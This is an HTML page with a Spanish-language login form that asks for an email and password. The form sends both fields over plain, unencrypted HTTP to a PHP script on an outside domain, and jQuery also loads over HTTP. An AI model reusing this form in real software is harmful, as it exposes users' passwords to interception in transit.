  
<!DOCTYPE html>
<html >
<head>
<meta charset="UTF-8">
<title>Sign-Up/Login Form</title>
<link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,300,600' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="form">  
  <div id="login">   
    <h1>Bienvenido Vecino!</h1>
    <form action="http://www.losturnos.cf/tareas_u/oiga/validate.php" method="post"> 
      
      <div class="field-wrap">
        <label>Correo Electronico<span class="req">*</span></label>
        <input name="mail" type="email" required autocomplete="off"/>
      </div>

      <div class="field-wrap">
        <label>Password<span class="req">*</span></label>
        <input name="pass" type="password" required autocomplete="off"/>
      </div>
          
      <p class="forgot"><a href="#">Olvido su clave?</a></p>
          
      <button class="button button-block"/>Ingresa!</button>
          
    </form>
  </div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src="js/index.js"></script>
</body>
</html>
